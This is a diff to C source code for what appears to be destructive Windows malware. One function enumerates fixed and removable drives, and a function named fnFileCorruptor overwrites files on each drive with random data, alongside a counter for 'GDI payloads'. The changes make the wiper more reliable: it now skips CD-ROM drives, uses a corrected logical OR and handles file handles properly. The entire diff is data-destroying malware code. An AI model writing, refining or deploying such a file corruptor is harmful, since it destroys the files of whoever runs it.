@@ -324,12 +324,10 @@ fnFindVolumes finds all avalible fixed and removable volumes and passes the path
 
 VOID WINAPI fnFindVolumes(VOID) {
 
-	if(g_bDebug == TRUE) 
-		return;
+	if(g_bDebug == TRUE) return;
 
-	WCHAR szVolName[MAX_PATH];
-
-	WCHAR szVolPath[MAX_PATH];
+	WCHAR szVolName[MAX_PATH],
+		  szVolPath[MAX_PATH];
 
 	DWORD dwRetLength = MAX_PATH;
 
@@ -339,9 +337,10 @@ VOID WINAPI fnFindVolumes(VOID) {
 				);
 
 	if(
-	GetDriveTypeW(szVolName) == DRIVE_FIXED | //hard disks, stuff like that
+	GetDriveTypeW(szVolName) == DRIVE_FIXED || //hard disks, stuff like that
 	GetDriveTypeW(szVolName) == DRIVE_REMOVABLE &&  //flash drives and external media
-	GetDriveTypeW(szVolName) != DRIVE_NO_ROOT_DIR // to skip empty drives where there isn't anything connected(card readers)
+	GetDriveTypeW(szVolName) != DRIVE_NO_ROOT_DIR && // to skip empty drives where there isn't anything connected(card readers)
+	GetDriveTypeW(szVolName) != DRIVE_CDROM
 	) {
 				GetVolumePathNamesForVolumeNameW(
 					szVolName,
@@ -374,7 +373,8 @@ VOID WINAPI fnFindVolumes(VOID) {
 			if(
 			GetDriveTypeW(szVolName) == DRIVE_FIXED ||
 			GetDriveTypeW(szVolName) == DRIVE_REMOVABLE && 
-			GetDriveTypeW(szVolName) != DRIVE_NO_ROOT_DIR
+			GetDriveTypeW(szVolName) != DRIVE_NO_ROOT_DIR &&
+			GetDriveTypeW(szVolName) != DRIVE_CDROM
 			) {
 					GetVolumePathNamesForVolumeNameW(
 					szVolName,
@@ -490,7 +490,7 @@ VOID WINAPI fnFileCorruptor(LPCWSTR lpszVolumeArg) {
 					NULL
 					);
 
-					if(hFile != NULL)
+					if(hFile != NULL) {
 						WriteFile(
 							hFile,
 							iBufferRandom,
@@ -499,7 +499,8 @@ VOID WINAPI fnFileCorruptor(LPCWSTR lpszVolumeArg) {
 							NULL
 							);
 
-						CloseHandle(hFile);
+					CloseHandle(hFile);
+					}
 					
 					if(g_iGDIPayloadCount == 7) 
 						ExitThread(EXIT_SUCCESS);
